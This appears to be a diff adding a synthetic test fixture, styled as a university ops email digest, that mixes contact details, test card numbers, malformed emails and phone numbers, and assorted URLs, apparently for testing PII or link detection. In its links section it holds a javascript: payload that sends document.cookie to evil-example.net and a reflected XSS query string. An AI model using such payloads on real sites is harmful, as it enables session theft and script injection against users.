@@ -1,0 +1,45 @@
+Subject: Weekly Applicant & Vendor Digest — ALU Kigali Campus
+
+Hi team,
+
+Following up on onboarding for this batch. Alvin Mugisha (alvin.mugisha@alueducation.com) confirmed his enrollment yesterday, and his emergency contact number is +250 788 123 456. His mentor, listed as an alumni contact, can be reached at grace.k@alumni.alueducation.com or on her backup line 078-812-3456.
+
+The SI office flagged an account under si.coordinator@si.alueducation.com for review — please cc them on all placement threads.
+
+Vendor note: our catering partner sent an invoice from "billing@fresh-eats.co" but the reply-to header shows billing@fresh‑eats.co (note the different dash character — looks like a spoofed lookalike domain, do not trust this one).
+
+Some malformed entries from the old spreadsheet import that we should NOT treat as valid:
+- not-an-email@@doubled.com
+- missing-domain@.com
+- plainaddress
+- user@[192.168.1.1]  (bracketed IP literal — technically valid RFC syntax but flag for manual review)
+
+Phone numbers collected from the front desk sign-in sheet (mixed formats, as usual):
+Front desk main line: (078) 812-3456
+Rwanda mobile: +250-788-000-111
+US visiting faculty (cell): 1-415-555-0198
+Local extension, not a full number: ext. 4521
+Garbled OCR entry: 07*8-1a2-3456 (skip this one)
+Plain unformatted mobile: 0788123456
+
+Payment records to reconcile (test/dummy numbers only, do not use real cards in production):
+Visa: 4111 1111 1111 1111
+Mastercard: 5500-0000-0000-0004
+Amex: 3400 000000 00009
+Obviously fake / malformed: 1234-5678
+All zeros (fake): 0000 0000 0000 0000
+Truncated: 4111 1111 **** 1111
+
+Links referenced in this week's newsletter:
+Main portal: https://portal.alueducation.com/dashboard?user=alvin&ref=weekly
+Docs: http://docs.alueducation.com/onboarding/v2/index.html
+Shortened (unverified): bit.ly/alu-fall-batch
+Suspicious link reported by a student (DO NOT FOLLOW, logged for security review only):
+javascript:fetch('https://evil-example.net/steal?cookie='+document.cookie)
+Another flagged one, looks like a reflected XSS attempt embedded in a query string:
+https://legit-looking-site.com/search?q=<script>alert(1)</script>&x=1
+FTP resource for archived records: ftp://files.alueducation.com/archive/2025/
+
+Reminder: front desk staff should NOT paste raw applicant data into shared docs. Mask card numbers and personal emails before forwarding anything externally.
+
+— Ops Team
